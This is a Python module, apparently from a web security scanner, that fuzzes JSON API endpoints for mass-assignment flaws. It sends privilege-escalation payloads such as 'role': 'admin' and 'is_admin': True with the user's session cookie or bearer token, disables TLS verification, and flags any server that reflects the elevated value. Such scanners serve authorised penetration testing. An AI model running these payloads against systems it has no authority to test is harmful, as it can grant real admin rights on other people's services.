import requests
from scanners.utils import GLOBAL_COOKIE, GLOBAL_BEARER

def run_mass_assignment_fuzzer(url):
    """
    Automatically injects hidden admin/privilege keys into JSON endpoints 
    to escalate privileges via Mass Assignment.
    """
    findings = []
    headers = {"Content-Type": "application/json"}
    if GLOBAL_COOKIE: headers["Cookie"] = GLOBAL_COOKIE
    if GLOBAL_BEARER: headers["Authorization"] = f"Bearer {GLOBAL_BEARER}"
    
    # Only test API endpoints
    if "/api/" not in url and "/v1/" not in url and "/v2/" not in url:
        return findings

    payloads = [
        {"role": "admin"},
        {"is_admin": True},
        {"isAdmin": True},
        {"permissions": "all"}
    ]
    
    for payload in payloads:
        try:
            r = requests.post(url, headers=headers, json=payload, timeout=5, verify=False)
            if r.status_code in [200, 201]:
                key = list(payload.keys())[0]
                val = list(payload.values())[0]
                
                try:
                    resp_json = r.json()
                    # Check if the server swallowed our payload and reflected it back as updated
                    if resp_json.get(key) == val or resp_json.get("data", {}).get(key) == val:
                        findings.append({
                            "type": "MASS_ASSIGNMENT_ESCALATION",
                            "url": url,
                            "severity": "HIGH",
                            "confidence": "HIGH",
                            "verified": True,
                            "detail": f"Mass Assignment / Privilege Escalation! Injected `{key}: {val}` into the JSON payload and the server accepted and reflected the elevated privilege."
                        })
                        break
                except Exception: 
                    pass
        except Exception: 
            pass
            
    return findings
